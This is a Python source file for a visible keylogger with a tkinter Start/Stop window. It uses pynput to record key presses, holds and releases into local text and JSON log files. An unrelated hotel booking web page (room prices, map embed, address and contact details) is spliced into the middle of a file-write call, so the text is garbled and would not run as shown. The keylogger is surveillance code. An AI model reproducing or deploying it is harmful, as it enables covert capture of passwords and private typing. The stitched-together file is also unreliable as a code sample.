
import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes
<!DOCTYPE >
<html>
    <head>
        <title>Book</title>
        <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <link rel="stylesheet" href="book.css">
    </head>
    <body>
      <div class="header" >
        <div class="logo">
          <img src="rr.png"  width="235px" height="120px">
        </div>
        <div class="contents">
          <a class='button' href='/'>HOME</a>
          <a class='button' href='/book'>ACCOMODATION</a>
          <a class='button' href='/faci'>FACILITIES</a> 
          <a class='button' href='/gallery'>GALLERY</a> 
        </div>
        <div class="Book">
           <a class='Book' href='/login'>Log In</a>
        </div>
      </div>
      <div class="gallery"> 
        <img src="headac1.jpg"  width="100%" height="450px">
      </div>
      <div1 class="g1">
        <h1>Accomodation</h1>
      </div1>
          <div class="block">
            <div class="i1">
                <img src="a1.webp" width="400px" height="200px">
                <h3>PREMIMIUM</h3>
                <p>BEDS : 2</p>
                <p>MAX PEOPLE : 4</p>
                <p>FACILITIES : WIFI,AC,TV,SPA</p>
                <P>STARTS FROM : 6,999/NIGHT</P>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
            <div class="i1">
                <img src="a2.webp" width="400px" height="200px">
                <h3>DELUXE</h3>
                <p>BEDS: 2</p>
                <p>MAX PEOPLE: 4</p>
                <p>FACILITIES: WIFI,TV</p>
                <p>STARTS FROM: 4999/NIGHT</p>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
            <div class="i1">
                <img src="a3.webp" width="400px" height="200px">
                <h3>STANDARD</h3>
                <p>BED : 1</p>
                <p>MAX PEOPLE : 2</p>
                <p>FACILITIES : WIFI</p>
                <P>STARTS FROM : 1999/NIGHT</P>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
            <div class="i1">
                <img src="a4.webp" width="400px" height="200px">
                <h3>FAMILY</h3>
                <p>BED : 3</p>
                <p>MAX PEOPLE : 6</p>
                <p>FACILITIES : WIFI,AC,TV</p>
                <P>STARTS FROM : 9,999/NIGHT</P>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
            <div class="i1">
                <img src="a5.webp" width="400px" height="200px">
                <h3>SINGLE</h3>
                <p>BED : 1</p>
                <p>MAX PEOPLE : 1</p>
                <p>FACILITIES : WIFI</p>
                <P>STARTS FROM : 999/NIGHT</P>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
            <div class="i1">
                <img src="a6.jpg" width="400px" height="200px">
                <h4>DIRECTOR</h4>
                <p>BED : 2</p>
                <p>MAX PEOPLE :4</p>
                <p>FACILITIES : WORK-SPACE,AC,TV,WIFI</p>
                <P>STARTS FROM : 14999/NIGHT</P>
                <a class='butt' href='/booking'>Book Now</a>
            </div>
          </div>
         <div class="final">
<h4 style="position:absolute;left:6%">
LOCATION
</h4>
<div style="position:absolute;left:5%; top:15% ;">
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d489219.0994241032!2d81.11883654344395!3d16.675671692992537!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a37d2ab8946b1f3%3A0x5681636406b48c4b!2sAvg%20Cinemas%20Multiplex%204k%20Dolby%20Atmos!5e0!3m2!1sen!2sin!4v1695897351866!5m2!1sen!2sin" width="350" height="200" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
</div >
<div style="position:absolute; left:43%; text-align:left">
<h4>ADDRESS</h4>
<p>Royal Palace Hotel</p>
<p>Near Avg Multiplex</p>
<p>Bhimavaram, Andhra Pradesh - 534204</p>
<p>Email: hotelroyalparadise@gmail.com</p>
<p>Call us :040 66110101</p>
</div>
<div style="position:absolute; left:70%; top:10%; " >
<img src="rr.png" style="width:75%;">
</div>
</div>
    </body>
</html>)

def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append(
            {'Pressed': f'{key}'}
        )
        flag = True

    if flag == True:
        keys_used.append(
            {'Held': f'{key}'}
        )
    generate_json_file(keys_used)


def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released': f'{key}'}
    )

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
